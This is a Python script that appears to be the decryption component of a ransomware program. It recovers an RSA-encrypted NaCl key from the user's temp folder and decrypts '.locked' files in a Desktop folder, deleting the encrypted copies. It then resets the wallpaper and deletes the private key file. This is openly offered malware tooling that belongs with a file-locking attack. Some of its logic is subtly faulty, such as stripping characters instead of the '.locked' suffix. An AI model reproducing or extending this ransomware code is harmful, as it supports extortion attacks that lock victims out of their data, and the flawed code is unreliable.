import nacl, nacl.secret, pathlib, os, ctypes 
from time import sleep
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
def change_bg():
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'C:\\Users\\{User}\\wallpaper.jpg', 3)
class Decrypt(object):                                     

    def __init__(self, Target,BoxM):     
        self.Target = Target          
        self.BoxM   = BoxM            

    def FileE(loc):
        DeFileN     = (loc.Target).strip(".locked") 
        EnFileN     = (loc.Target)               
        Date        = 0                          

        with open(EnFileN,"rb") as  File: Date = File.read()       
        Decrypted   = loc.BoxM.decrypt(Date)                       
        with open(DeFileN,"wb") as  File: File.write(Decrypted)    
        os.remove(EnFileN)                  

User        =  os.getlogin()
encrypted_key_file = "C:/Users/"+User+"/appdata/local/temp/encrypted_key.txt"
key_file = input('Enter the path to private key file : ')
file_in = open(encrypted_key_file, "rb")
hexed_key = file_in.read()
private_key = RSA.import_key(open(key_file).read())
cipher_rsa = PKCS1_OAEP.new(private_key)
decMessage = cipher_rsa.decrypt(hexed_key)
decMessage = decMessage.decode('utf-8')
box = nacl.secret.SecretBox(bytes.fromhex(decMessage))                        
Paths    = [r"C:/Users/"+User+"/Desktop/files"] 
for  AllFiles in Paths:                                             
    if (pathlib.Path(AllFiles).exists()):                           
        for path, subdirs, files in os.walk(AllFiles):
            for file in files :                                 
                if(".locked" in file):                             
                    FilePath    = os.path.join(path, file)      
                    Decrypt(FilePath,box).FileE()             
change_bg()
os.remove('private.pem')